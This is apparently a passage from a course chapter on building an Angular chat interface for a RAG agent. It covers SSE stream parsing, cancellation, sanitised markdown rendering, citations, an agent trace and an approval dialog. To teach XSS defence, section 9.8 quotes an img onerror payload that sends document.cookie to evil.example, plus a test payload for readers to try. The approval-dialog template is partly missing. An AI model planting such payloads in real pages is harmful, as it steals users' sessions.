    return err instanceof Error ? err.message : 'Streaming failed.';
  }
Line(s)What it doesWhy we need it
new AbortController()Creates a cancellation handle, stored on the service.Its signal goes into fetch; calling abort() tears down the HTTP request. This is the browser half of section 4.5's "Try this" — the server sees the connection close and stops generating, so cancel actually saves compute.
Accept: 'text/event-stream'Tells the server we want SSE.Good practice, and some proxies key buffering behaviour off it.
if (!response.ok || !response.body)Checks the status and that a body exists.fetch does not reject on 4xx/5xx — a 500 is a perfectly successful fetch. Forgetting this check is the most common fetch bug.
pipeThrough(new TextDecoderStream())Decodes bytes to strings as they arrive.Handles multi-byte UTF-8 split across chunks. Decoding each chunk with your own TextDecoder and no {stream: true} corrupts any emoji or accented character unlucky enough to straddle a boundary.
while (true) { await reader.read() }The read loop.done becomes true when the server closes the stream. Each await yields to the browser, so the UI stays responsive.
buffer += value then indexOf('\n\n')Buffers across chunks and consumes only complete events.The fix for the danger box above. Anything after the last blank line stays in the buffer for the next read.
the trailing if (buffer.trim())Handles a final event with no trailing blank line.Servers are inconsistent about the last delimiter. Without this you occasionally lose the done event and the caret blinks forever.
line.slice(5).replace(/^ /, '')Strips data: and exactly one optional leading space.Per the SSE specification. Stripping all leading whitespace would corrupt indented content in a code block the model is streaming.
dataLines.join('\n')Rejoins multi-line data.SSE allows several data: lines per event, which the spec says to join with newlines. Our server sends one, but handling it costs nothing.
as StreamEventAn assertion, not a check.Honest about the limit from 9.2: JSON.parse returns any. If the server contract changes, this lies. Validating here with Zod is the rigorous option — the client-side equivalent of Pydantic.
switch (event.event)Dispatches on the discriminated union.Inside case 'token' the compiler knows event.data.text exists. That is 9.2's union paying off.
token case using update + spreadAppends text immutably.Mutating m.text += would not change the array reference and the UI would freeze. Yes, this allocates a new array per token — Angular only updates the one changed binding, so at 60 tokens/second it is not the bottleneck. If it ever were, hold the streaming text in its own signal.
case 'approval' setting a signalSurfaces a pending tool call.The frontend half of section 6.10's approval gate. The dialog in 9.10 watches this signal.
err.name === 'AbortError'Distinguishes a cancel from a failure.Important UX detail. The user pressing Stop is not an error. Setting error: undefined leaves the partial text on screen with no red warning.
finally { ... }Always clears the controller and the flags.Without this, one failure leaves busy stuck true and the UI is dead until reload.
err instanceof TypeErrorDetects a network-level failure.fetch reports CORS failures and unreachable hosts as a bare TypeError with a deliberately vague message, so we supply a useful one. See 9.12.
signals updated from a fetch callbackWorks with no NgZone involvement.The zoneless payoff from 9.3. In an older zone.js app you would need NgZone.run(...) around these updates or the screen would not move.

Verifying the parser — the part you should not take on trust

The buffering logic is the one piece of Part 9 where a subtle bug is invisible locally and fatal in production. Here is the same algorithm run against one stream delivered three ways: whole, chopped every 20 bytes, and one byte at a time.

same stream, different network chunk boundaries:
one big chunk              events=5  text="Retrieval augmented generation"
chopped every 20 bytes     events=5  text="Retrieval augmented generation"
one byte at a time         events=5  text="Retrieval augmented generation"

all three identical: true

events from the stream:
  token      {"text":"Retrieval "}
  token      {"text":"augmented "}
  token      {"text":"generation"}
  citations  [{"source":"setup.md","chunk_id":4}]
  done       {"tokens":63,"seconds":4.9}

naive version that splits each chunk independently:
  produced 4 fragments instead of 5 events
  first fragment: "event: token\ndata: {"

Read the last two lines. The naive version produced 4 corrupted fragments instead of 5 events, and its first "event" is the truncated string event: token\ndata: { — which would fail JSON.parse and silently drop a token. That is the bug the buffer prevents.

The Stop button

    @if (streaming()) {
      <button type="button" class="stop" (click)="stop()">Stop</button>
    } @else {
      <button type="button" (click)="send()" [disabled]="!canSend()">Send</button>
    }
  readonly streaming = this.chat.streaming;

  send(): void {
    if (!this.canSend()) return;
    void this.chat.askStreaming(this.draft().trim());
    this.draft.set('');
  }

  stop(): void {
    this.chat.cancel();
  }
Line(s)What it doesWhy we need it
void this.chat.askStreaming(...)Calls an async method without awaiting, and says so.The void operator documents "fire and forget" and satisfies lint rules about unhandled promises. The method handles its own errors internally, which is why this is safe.
Send and Stop swapping, not sitting side by sideOne button, two states.Only one is ever valid. Two buttons where one is always disabled is worse UI and more code.
stop() delegating to the serviceThe component does not own the controller.The service owns the request lifecycle, so cancel belongs there. The component just forwards a click.

The EventSource version, for comparison

  askWithEventSource(question: string): void {
    const target = this.addAssistantPlaceholder();
    const url = `${this.base}/api/chat/sse?question=${encodeURIComponent(question)}`;
    const source = new EventSource(url);

    source.addEventListener('token', (e) => {
      const { text } = JSON.parse((e as MessageEvent).data);
      this.messages.update((list) =>
        list.map((m) => (m.id === target.id ? { ...m, text: m.text + text } : m)),
      );
    });

    source.addEventListener('done', () => {
      this.patch(target.id, { streaming: false });
      source.close();                    // otherwise it reconnects forever
    });

    source.onerror = () => {
      this.patch(target.id, { streaming: false, error: 'Stream failed.' });
      source.close();
    };
  }
Line(s)What it doesWhy we need it
new EventSource(url)Opens the connection and parses SSE for you.Twelve lines against sixty. When the constraints fit, it is clearly the better choice.
encodeURIComponent(question)Escapes the question into the URL.Mandatory, and the reason this approach fails for us: URLs have practical length limits around a few thousand characters, and a question plus conversation history will exceed them.
addEventListener('token', ...)Listens for named events.Matches the event: field. Unnamed events arrive on onmessage.
source.close() inside the done handlerCloses the connection explicitly.Not optional. EventSource reconnects automatically when the server closes the stream, so without this you get an infinite loop of new generations. A genuinely expensive mistake against an LLM endpoint.
onerror also closingStops reconnection on failure.Same trap: the default behaviour is to retry.

M17 is done. git commit -m "M17: token streaming in Angular with cancel". You now have the two things section 7.9 said the prototype tools hide: streaming rendered token by token, and cancellation that reaches the server.

Common errors and how to fix them
ErrorCauseFix
Whole answer appears at once, not token by tokenSomething is buffering: a proxy, nginx, or FastAPI itself.Check with curl -N against the API directly. If curl streams and the browser does not, it is the dev-server proxy or nginx — see 9.12 and Part 10, and set X-Accel-Buffering: no on the response.
Occasional garbled character mid-streamManual byte decoding without stream mode.Use TextDecoderStream, as above. Reproduce by streaming an answer containing an emoji.
JSON.parse errors every few tokensNot buffering across chunks.The verified output above is the argument. Buffer, then split on the blank line.
Text updates but the screen does notMutating the message object instead of replacing it, or using a plain field on a zoneless app.Immutable update through the signal, always.
Stop button does nothing visibleThe abort works, but the server keeps generating.Your FastAPI handler must notice the disconnect. Part 10 covers it; section 4.5's with-block generator is the mechanism.
An "AbortError" appears as a red error messageNot special-casing the cancel path.Check err.name === 'AbortError' and leave the partial text without an error.
Try this yourself. Ask a long question, press Stop halfway, then look at your backend logs. If the model keeps generating after the browser disconnected, you have found the other half of cancellation — and you will know exactly what to build in Part 10. Then throttle to "Slow 3G" in devtools and confirm the answer still assembles correctly: that is the chunk-boundary logic being exercised for real.

9.8 Rendering model output safely

Read this before writing any markdown code. Your model's output can contain text copied from a document in your RAG index. You did not write that document. Section 3.6 showed an attacker putting instructions in a PDF; the same attacker can put <img src=x onerror="fetch('https://evil.example/?c='+document.cookie)"> in it. If the model quotes it and you render that as HTML without sanitising, you have executed an attacker's JavaScript in your own application, with your user's session. This is not theoretical, and it is the single most dangerous thing in Part 9.

Angular's three levels of trust

What you writeWhat Angular doesSafe?
{{ text }}Inserts as text. Tags are escaped and displayed literally.Completely. Nothing can execute. This is what 9.3 used.
[innerHTML]="html"Parses as HTML but runs it through Angular's built-in sanitiser first, stripping scripts, event handlers and dangerous attributes.Yes — this is the default you should want.
[innerHTML]="sanitizer.bypassSecurityTrustHtml(html)"Nothing. Inserts the string verbatim. The name is a promise you are making to Angular.Only if you sanitised it yourself. Otherwise this is the vulnerability.

The discipline, in order of preference.

  1. Use {{ }} if you can live without formatting. Zero risk.
  2. Use [innerHTML] with markdown output and let Angular sanitise. Correct for almost every case. ⚠ Angular's sanitiser allowlist has changed across versions — test whether it keeps the class attributes your syntax highlighter needs, rather than assuming.
  3. If and only if Angular's sanitiser strips something you genuinely need, run DOMPurify yourself and then bypass. Never bypass without a sanitiser in the chain.
npm install marked dompurify
npm install -D @types/dompurify   # only if your dompurify version ships no types
LibraryLicenceWhy this one
markedMITFast, small, synchronous markdown-to-HTML. markdown-it is the other good choice, with a plugin ecosystem. Note marked does not sanitise — it removed that feature deliberately and tells you to use a dedicated sanitiser.
DOMPurifyApache-2.0 / MPLThe standard HTML sanitiser: parses into a DOM and removes anything dangerous. Actively maintained against new bypass techniques, which is exactly why you do not write your own.
highlight.jsBSD-3Optional, for code blocks. Same library this course's page uses. Adds real weight — consider loading it lazily.

Build a markdown service that is safe by construction, and handles the partial markdown that streaming inevitably produces.

ng generate service core/markdown
import { Injectable } from '@angular/core';
import DOMPurify from 'dompurify';
import { marked } from 'marked';

@Injectable({ providedIn: 'root' })
export class MarkdownService {
  constructor() {
    marked.setOptions({ gfm: true, breaks: true });
  }

  /**
   * Render model output to sanitised HTML.
   * Order matters: markdown first, then sanitise. Never the other way round.
   */
  render(markdown: string, streaming = false): string {
    const source = streaming ? this.makePartialSafe(markdown) : markdown;
    const rawHtml = marked.parse(source, { async: false }) as string;

    return DOMPurify.sanitize(rawHtml, {
      ALLOWED_TAGS: [
        'p', 'br', 'strong', 'em', 'del', 'code', 'pre', 'blockquote',
        'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'a', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'hr', 'span',
      ],
      ALLOWED_ATTR: ['href', 'title', 'class', 'colspan', 'rowspan'],
      ALLOW_DATA_ATTR: false,
      FORBID_TAGS: ['style', 'iframe', 'img', 'svg', 'form', 'input'],
    });
  }

  /** Mid-stream, markdown is often half-written. Close what is open. */
  private makePartialSafe(text: string): string {
    return this.stripDanglingInline(this.closeOpenFences(text));
  }

  private closeOpenFences(text: string): string {
    const fences = (text.match(/^```/gm) ?? []).length;
    return fences % 2 === 1 ? text + '\n```' : text;
  }

  private stripDanglingInline(text: string): string {
    const fenceTicks = (text.match(/^```/gm) ?? []).length * 3;
    const ticks = (text.match(/`/g) ?? []).length - fenceTicks;
    return ticks % 2 === 1 ? text.slice(0, text.lastIndexOf('`')) : text;
  }
}
Line(s)What it doesWhy we need it
marked.setOptions({ gfm: true, breaks: true })GitHub-flavoured markdown, and single newlines become <br>.GFM gives you tables and strikethrough, which models emit constantly. breaks: true matches what users expect from chat, where a lone newline should be a line break.
marked.parse(source, { async: false }) as stringRenders markdown to an HTML string, synchronously.⚠ marked's return type is string | Promise<string> depending on options, hence the assertion. Verify the signature for your installed version — this API has changed across majors.
markdown then sanitiseThe order of the two calls.Not interchangeable. Sanitising first, then rendering markdown, lets markdown syntax reconstruct dangerous HTML after the sanitiser has already run. Always render first, sanitise last, insert third.
ALLOWED_TAGS as an explicit listAn allow-list, not a block-list.Section 6.3's principle again: enumerate what is permitted. A block-list is a promise to have thought of every attack, which nobody can keep.
ALLOWED_ATTR: ['href', 'title', 'class', ...]Permits class for syntax highlighting, and nothing else interesting.Note what is absent: no onclick, no style, no src. Event-handler attributes are the classic injection vector.
FORBID_TAGS: [..., 'img', ...]Blocks images explicitly.Deliberate and worth understanding: <img src=x onerror=...> is the payload from the danger box, and even a well-formed remote image is a tracking pixel and a data-exfiltration channel via the URL. Allow images only if you need them, and then only from your own origin.
ALLOW_DATA_ATTR: falseStrips data-* attributes.They cannot execute directly but they are a useful smuggling channel for other bugs. Nothing in markdown needs them.
no bypassSecurityTrustHtml anywhereThe service returns a plain string.Deliberate. We hand the sanitised string to [innerHTML] and let Angular sanitise it again. Two independent sanitisers, and the dangerous API appears nowhere in the codebase — so it cannot be copied carelessly.
closeOpenFencesAppends a closing fence when an odd number are open.Mid-stream you frequently have ```python with no closing fence. Unbalanced, marked renders the rest of the answer as one giant code block, which then unwinds when the fence arrives — a very visible flicker.
stripDanglingInlineRemoves a trailing unmatched backtick.A lone ` at the stream's edge would swallow the next tokens into inline code. Subtracting the fence backticks first avoids miscounting.
streaming = false parameterPartial-safety only while streaming.Once complete, render the real text. If the finished markdown is genuinely unbalanced, that is the model's output and you should show it faithfully.

Verified: the fence balancer across a real stream

fence balancing as the stream arrives:
  chars= 21 balanced=true  tail="Here is how to do it:"
  chars= 28 balanced=true  tail=" is how to do it:\n\n```py\n```"
  chars= 48 balanced=true  tail="``python\nimport requests\n```"
  chars= 60 balanced=true  tail="ort requests\nprint(\"hi\")\n```"
  chars= 64 balanced=true  tail="ort requests\nprint(\"hi\")\n```"
  chars= 87 balanced=true  tail=")\n```\n\nCall `requests.post`."

Every intermediate state is balanced, so every frame renders as a proper code block that grows — rather than a code block that swallows the page and then releases it. Note the second line: an opening fence with only py typed so far already gets a closing fence appended.

Using it in the bubble

  private readonly markdown = inject(MarkdownService);

  /** Recomputed on every token, which is fine: marked is fast and this is one string. */
  readonly html = computed(() =>
    this.markdown.render(this.message().text, this.message().streaming),
  );
    @if (isUser()) {
      <div class="text">{{ message().text }}</div>
    } @else {
      <div class="text markdown" [innerHTML]="html()"></div>
    }
Line(s)What it doesWhy we need it
computed(() => ... render(...))Re-renders the markdown when the text changes.Caches automatically: reading html() twice in a template parses once. Recomputing per token is acceptable — marked handles a few kilobytes in well under a millisecond. If you ever have a 50 KB answer, render plain text while streaming and markdown once at the end.
user messages use {{ }}, not markdownDifferent rendering per role.A real security decision. The user's own text has no reason to become HTML, so we do not give it the chance. Minimise the surface: only untrusted-but-necessary content goes through the HTML path.
[innerHTML]="html()"Inserts the sanitised HTML, sanitised again by Angular.Defence in depth for free. And because we never call bypassSecurityTrustHtml, Angular's protection is intact even if DOMPurify were misconfigured.
Try this yourself, it takes two minutes and you will remember it. Put this text in a document, ingest it, and ask a question that retrieves it: <img src=x onerror="alert('you are owned')">. With [innerHTML] and the service above, nothing happens — the tag is gone. Now temporarily switch to bypassSecurityTrustHtml(marked.parse(text)) with no DOMPurify and ask again. The alert fires. You have just executed an attacker's code from a document, in your own app, and you will never type bypassSecurityTrustHtml casually again. Revert it immediately.
Deeper dive: code highlighting, and doing it lazily

highlight.js is not small. Loading it eagerly for a feature that only matters when the model emits code is a poor trade. The pattern:

  • Render markdown without highlighting first, so text appears immediately.
  • After the stream completes, check whether the HTML contains a <pre><code> block.
  • If it does, await import('highlight.js/lib/core') plus only the languages you care about, highlight, and update the signal.

Two details that bite: highlight.js adds class attributes and <span> elements, so both must be in your DOMPurify allow-list — they are in the list above, deliberately. And if you highlight before sanitising, you must trust that highlight.js never emits anything dangerous; safer to highlight the already-sanitised HTML, or sanitise once more afterwards.

9.9 Chat UI patterns: autoscroll, virtual scrolling, states

Autoscroll that respects the user

The naive implementation scrolls to the bottom whenever the text changes. That is actively hostile: the user scrolls up to read a citation and gets yanked back sixty times a second.

Scroll to the bottom on new content, unless the user has scrolled away.

import { effect, viewChild, ElementRef } from '@angular/core';

  private readonly stream = viewChild<ElementRef<HTMLElement>>('stream');
  private pinnedToBottom = true;

  constructor() {
    effect(() => {
      // Reading these makes the effect re-run whenever they change.
      const list = this.messages();
      const last = list[list.length - 1];
      void last?.text;

      if (!this.pinnedToBottom) return;
      const el = this.stream()?.nativeElement;
      if (el) {
        queueMicrotask(() => {
          el.scrollTop = el.scrollHeight;
        });
      }
    });
  }

  onScroll(): void {
    const el = this.stream()?.nativeElement;
    if (!el) return;
    const distanceFromBottom = el.scrollHeight - el.scrollTop - el.clientHeight;
    this.pinnedToBottom = distanceFromBottom < 80;
  }
  <div class="stream" #stream (scroll)="onScroll()">
Line(s)What it doesWhy we need it
#stream in the templateNames the element.The Angular equivalent of a React ref.
viewChild<ElementRef<HTMLElement>>('stream')A signal holding the element (v17.2+).Older code uses the @ViewChild() decorator, which is not a signal and is awkward to read at the right time. This form is strictly better.
void last?.textReads the text without using it.Deliberate and worth understanding. Effects track what they read. Without touching the last message's text, the effect would not re-run on each token, only when a message is added or removed. The void makes the intent explicit rather than looking like a mistake.
pinnedToBottom as a plain fieldNot a signal.Correct here: nothing in a template reads it, so it does not need reactivity. Making everything a signal is as wrong as making nothing one.
distanceFromBottom < 80An 80-pixel tolerance.Exact equality never holds — sub-pixel layout, momentum scrolling, and the element growing between events. A tolerance is not sloppiness, it is the only thing that works.
queueMicrotask(...)Defers the scroll until after the DOM update.The effect can run before the new text is laid out, in which case scrollHeight is stale and you land 20 pixels short. Deferring by a microtask fixes it. afterNextRender is the framework-blessed alternative ⚠ — check its signature for your version.
(scroll)="onScroll()"Updates the pinned flag as the user scrolls.Scroll events fire frequently; this handler does two arithmetic operations and no DOM writes, so it is cheap enough not to need throttling.

Virtual scrolling, for when the history gets long

A 500-message conversation is 500 components, each with rendered markdown. Virtual scrolling renders only what is visible.

ng add @angular/cdk
<cdk-virtual-scroll-viewport itemSize="120" class="stream">
  <app-message-bubble
    *cdkVirtualFor="let message of messages(); trackBy: trackById"
    [message]="message" />
</cdk-virtual-scroll-viewport>
Line(s)What it doesWhy we need it
ng add @angular/cdkInstalls the Component Dev Kit.ng add rather than npm install: it installs and runs setup schematics. Import ScrollingModule in the component's imports.
itemSize="120"Estimated pixel height of one item.The catch. The default strategy assumes fixed heights, and chat messages vary wildly. Get it wrong and the scrollbar lies. An autosize strategy exists in the CDK's experimental package ⚠ — check its current status before relying on it.
*cdkVirtualFor, not @forThe CDK's own structural directive.Worth flagging: the modern @for block does not work here. Virtual scrolling needs the directive, and trackBy takes a function rather than an expression.

Do not add this yet. Virtual scrolling costs you variable heights, complicates autoscroll, and interferes with browser find-in-page — a real usability loss in a research tool. Measure first: a few hundred simple bubbles are fine without it. The honest trigger is when profiling shows rendering time growing with history length. Two cheaper options first: paginate old messages behind a "load earlier" button, or render markdown only for the last N messages.

Every state, explicitly

StateSignalWhat the user sees
Idle, emptymessages().length === 0"Ask a question about your indexed documents."
Sendingbusy() before the first tokenDisabled composer, "Thinking…" in the bubble.
Streamingmessage.streaming with text presentText growing, blinking caret, Stop button.
Cancelledstreaming false, no error, partial textPartial answer, no red warning, Send available again.
Failedmessage.error setThe specific message from describe(), plus Retry.
Awaiting approvalpendingApproval() not nullThe modal from 9.10, agent paused.
Donenone of the aboveFooter with source and tool counts, citations panel populated.

Seven states. The prototype tools from section 7.9 give you roughly two, which is why demos feel fine and products feel broken. Enumerating them in a table like this before writing the template is the whole technique.

9.10 M18 — citations, the agent trace, and the approval dialog

Three components that are not chat decoration — they are the product. This is what section 7.9 meant by "the UI becomes the product".

The citations panel

ng generate component features/chat/citations-panel
import { Component, computed, input, output } from '@angular/core';

import { Citation, RetrievedChunk } from '../../core/models';

@Component({
  selector: 'app-citations-panel',
  templateUrl: './citations-panel.html',
  styleUrl: './citations-panel.scss',
})
export class CitationsPanel {
  readonly citations = input.required<Citation[]>();
  readonly chunks = input<RetrievedChunk[]>([]);
  readonly openSource = output<Citation>();

  /** Pair each citation with the chunk it points at, if we have it. */
  readonly items = computed(() =>
    this.citations().map((citation) => {
      const chunk = this.chunks().find(
        (c) => c.source === citation.source && c.chunk_id === citation.chunk_id,
      );
      return {
        citation,
        heading: chunk?.heading ?? null,
        context: chunk ? this.highlight(chunk.text, citation.quote) : null,
        verified: chunk ? this.contains(chunk.text, citation.quote) : false,
      };
    }),
  );

  private normalise(text: string): string {
    return text.replace(/\s+/g, ' ').trim().toLowerCase();
  }

  /** Same check as backend/app/verify.py, so the UI cannot disagree with the API. */
  private contains(chunkText: string, quote: string): boolean {
    return this.normalise(chunkText).includes(this.normalise(quote));
  }

  /** Split the chunk around the quote so the template can mark it, without HTML. */
  private highlight(chunkText: string, quote: string): [string, string, string] | null {
    const index = this.normalise(chunkText).indexOf(this.normalise(quote));
    if (index === -1) return null;
    return [
      chunkText.slice(0, index),
      chunkText.slice(index, index + quote.length),
      chunkText.slice(index + quote.length),
    ];
  }
}
@if (items().length > 0) {
  <aside class="panel" aria-label="Sources">
    <h3>Sources</h3>

    @for (item of items(); track item.citation.source + item.citation.chunk_id) {
      <article class="citation" [class.unverified]="!item.verified">
        <button type="button" class="ref" (click)="openSource.emit(item.citation)">
          {{ item.citation.source }}#{{ item.citation.chunk_id }}
        </button>

        @if (item.heading) {
          <span class="heading">{{ item.heading }}</span>
        }

        @if (item.context) {
          <p class="context">{{ item.context[0]
            }}<mark>{{ item.context[1] }}</mark>{{ item.context[2] }}</p>
        } @else {
          <p class="context">"{{ item.citation.quote }}"</p>
        }

        @if (!item.verified) {
          <p class="warn">This quote was not found in the retrieved text.</p>
        }
      </article>
    }
  </aside>
}
.panel {
  border-left: 1px solid #dcdfe4;
  padding: 1rem;
  width: 22rem;
  overflow-y: auto;

  h3 { margin: 0 0 0.75rem; font-size: 0.9rem; }
}

.citation {
  margin-bottom: 1rem;
  padding-bottom: 0.75rem;
  border-bottom: 1px solid #eef0f4;

  &.unverified { border-left: 3px solid #c0392b; padding-left: 0.5rem; }
}

.ref {
  font: inherit;
  font-size: 0.8rem;
  font-family: ui-monospace, monospace;
  background: none;
  border: none;
  padding: 0;
  color: #2f4bd8;
  cursor: pointer;
  text-decoration: underline;
}

.heading { display: block; font-size: 0.75rem; color: #5b6472; margin-top: 0.15rem; }

.context {
  font-size: 0.85rem;
  line-height: 1.5;
  color: #333;
  margin: 0.4rem 0 0;
  max-height: 8rem;
  overflow: hidden;

  mark { background: #ffe066; }
}

.warn { color: #c0392b; font-size: 0.75rem; margin: 0.4rem 0 0; }
Line(s)What it doesWhy we need it
chunks = input<RetrievedChunk[]>([])Optional input with a default.Citations alone give you the quote; the chunks give you surrounding context. The panel degrades gracefully when only citations are available.
items = computed(...) joining the twoPairs each citation with its chunk.The join belongs in the component, not the template. Templates should read values, not perform lookups.
contains() mirroring verify.pyRe-checks the quote in the browser.Deliberate duplication. The server already verified (section 5.7), but re-checking client-side means a bug or a bypass in one layer is visible in the other. The normalise logic is identical to the Python — whitespace collapsed, lowercased — so they cannot disagree.
highlight() returning a three-part tupleSplits the chunk into before / quote / after.The security-relevant choice. The obvious implementation builds ...<mark>...</mark>... as an HTML string and needs innerHTML — which means untrusted document text on the HTML path. Returning three plain strings lets the template use {{ }} and <mark>, so injection is impossible by construction.
[string, string, string]A tuple type: exactly three strings.Stronger than string[] — the compiler knows context[2] exists.
track item.citation.source + item.citation.chunk_idA composite key.Chunk id alone is not unique across documents — the same reasoning as section 5.7's lookup key.
<button> for the reference, not a <div>A real button.Keyboard focusable and announced correctly, for free. Clickable divs are an accessibility bug that costs nothing to avoid.
the unverified branchShows a red warning when the quote is not in the chunk.The most important behaviour here. Section 2.8 said the fix for fabricated citations is verification the user can see. This is that, in the interface.
max-height: 8rem; overflow: hiddenCaps the context excerpt.A 4,000-character chunk would take over the panel. Clicking the reference opens the full document.

The agent trace viewer

ng generate component features/chat/trace-viewer
import { Component, computed, input } from '@angular/core';

import { AgentStep } from '../../core/models';

@Component({
  selector: 'app-trace-viewer',
  templateUrl: './trace-viewer.html',
  styleUrl: './trace-viewer.scss',
})
export class TraceViewer {
  readonly steps = input.required<AgentStep[]>();

  readonly failures = computed(() => this.steps().filter((s) => !s.ok).length);
  readonly toolCalls = computed(() => this.steps().filter((s) => s.tool).length);

  format(args: Record<string, unknown> | null): string {
    return args ? JSON.stringify(args, null, 2) : '';
  }

  truncate(text: string | null, limit = 400): string {
    if (!text) return '';
    return text.length > limit ? text.slice(0, limit) + ' …' : text;
  }
}
@if (steps().length > 0) {
  <details class="trace">
    <summary>
      Agent trace — {{ steps().length }} steps, {{ toolCalls() }} tool calls
      @if (failures() > 0) {
        <span class="badge">{{ failures() }} failed</span>
      }
    </summary>

    <ol class="steps">
      @for (step of steps(); track step.n) {
        <li [class.failed]="!step.ok">
          <div class="head">
            <span class="n">{{ step.n }}</span>
            <span class="tool">{{ step.tool ?? 'final answer' }}</span>
            <span class="status">{{ step.ok ? 'ok' : 'error' }}</span>
          </div>

          <p class="thought">{{ step.thought }}</p>

          @if (step.args) {
            <pre class="args">{{ format(step.args) }}</pre>
          }
          @if (step.observation) {
            <pre class="obs">{{ truncate(step.observation) }}</pre>
          }
        </li>
      }
    </ol>
  </details>
}
.trace {
  margin-top: 0.75rem;
  border: 1px solid #dcdfe4;
  border-radius: 8px;
  font-size: 0.85rem;

  summary { padding: 0.5rem 0.75rem; cursor: pointer; color: #5b6472; }

.badge {

  padding: 0 0.4rem;
  border-radius: 99px;
  background: #fdecea;
  color: #c0392b;
  font-size: 0.75rem;
}

.steps { margin: 0; padding: 0 0.75rem 0.75rem 2rem; }

li {
  margin-bottom: 0.75rem;

  &.failed .status { color: #c0392b; font-weight: 600; }
}

.head { display: flex; gap: 0.5rem; align-items: baseline; }
.n { font-family: ui-monospace, monospace; color: #5b6472; }
.tool { font-weight: 600; }
.status { font-size: 0.75rem; color: #1d7a4c; }
.thought { margin: 0.15rem 0; color: #333; }

pre.args, pre.obs {
  margin: 0.25rem 0 0;
  padding: 0.4rem 0.6rem;
  background: #f6f7f9;
  border-radius: 6px;
  font-size: 0.78rem;
  white-space: pre-wrap;
  word-break: break-word;
  max-height: 10rem;
  overflow: auto;
}
Line(s)What it doesWhy we need it
input.required<AgentStep[]>()Takes the steps straight from the backend.These are the Step dataclasses from section 6.4, serialised. The trace viewer exists because we kept them.
<details> / <summary>Native collapsible disclosure.No JavaScript, no state, keyboard accessible, and it works before hydration. Reaching for a custom accordion component here would be strictly worse.
{{ steps().length }} steps, {{ toolCalls() }} tool callsA summary line that is useful when collapsed.The trace is collapsed by default — the summary has to tell you whether opening it is worth it.
the failures() badgeSurfaces failed steps without expanding.Section 6.4's run had a failed calculator call that the agent recovered from. That is interesting and should be visible, not buried.
step.tool ?? 'final answer'Handles the terminal step.tool is null when the model returned final. Nullish coalescing gives it a readable label.
<pre>{{ format(step.args) }}</pre>Pretty-printed JSON as text.Interpolation, not innerHTML — tool arguments come from the model and may contain document text. No sanitiser needed because nothing is parsed as HTML.
truncate(step.observation)Caps observations at 400 characters.A retrieval observation is several kilobytes of chunk text. Section 6.3 truncated it for the model; the UI needs the same courtesy.
word-break: break-wordWraps long unbroken strings.A base64 blob or a long URL in an observation would otherwise stretch the panel horizontally and break the layout.
format() and truncate() as methods, not computedThey take arguments.A computed takes none. Methods called from templates run on each change detection, which is fine for cheap string work on a collapsed panel.

The approval dialog

ng generate component features/chat/approval-dialog
import { Component, computed, input, output } from '@angular/core';

import { PendingApproval } from '../../core/models';

@Component({
  selector: 'app-approval-dialog',
  templateUrl: './approval-dialog.html',
  styleUrl: './approval-dialog.scss',
})
export class ApprovalDialog {
  readonly pending = input.required<PendingApproval>();
  readonly decided = output<boolean>();

  /** Every argument, in full. Never summarise what the user is approving. */
  readonly argumentRows = computed(() =>
    Object.entries(this.pending().args).map(([key, value]) => ({
      key,
      value: typeof value === 'string' ? value : JSON.stringify(value, null, 2),
    })),
  );

  onKeydown(event: KeyboardEvent): void {
    if (event.key === 'Escape') {
      this.decided.emit(false);
    }
  }
}

      </button>

        Allow once
      </button>
    </div>
  </div>
</div>

Line(s)What it doesWhy we need it
argumentRows showing every argumentRenders all of them, in full, no truncation.Section 6.10's requirement, in code. "The agent wants to write a file. OK?" trains people to click yes, which is worse than no gate. For a file write, this shows the entire content being written.
JSON.stringify(value, null, 2) for non-stringsPretty-prints objects; leaves strings alone.Stringifying a string would wrap it in quotes and escape its newlines, making file content unreadable at exactly the moment it matters.
<pre>{{ row.value }}</pre>Interpolated, never innerHTML.These arguments were produced by a model that may have read a hostile document. The approval dialog is the last place you would want an injection.
role="dialog" aria-modal="true"Announces it as a modal.Screen readers otherwise read the page behind it. ⚠ For real focus trapping use the CDK's A11yModule or the native <dialog> element — this markup is honest about being the minimum.
autofocus on DenyThe safe option gets focus.Deliberate. Enter should not approve a file write. Section 6.4's default was deny; the UI matches.
Escape emits falseDismissing is denying.Never treat "the user closed the dialog" as consent.
"Allow once", not "Allow"Explicit scope in the label.Section 7.9's writing guidance: a CTA says exactly what happens. No blanket permission is being granted, so do not imply one.
Allow styled red, Deny neutralThe dangerous action looks dangerous.Inverted from the usual "primary action is coloured" convention, on purpose.

Wiring all three into the chat page

<section class="page">
  <div class="columns">
    <div class="stream" #stream (scroll)="onScroll()">
      @for (message of messages(); track message.id) {
        <app-message-bubble [message]="message" (retry)="onRetry($event)" />
        @if (message.steps.length > 0) {
          <app-trace-viewer [steps]="message.steps" />
        }
      } @empty {
        <p class="empty">Ask a question about your indexed documents.</p>
      }

      <app-citations-panel
        [citations]="lastCitations()"
        [chunks]="lastChunks()"
        (openSource)="onOpenSource($event)" />
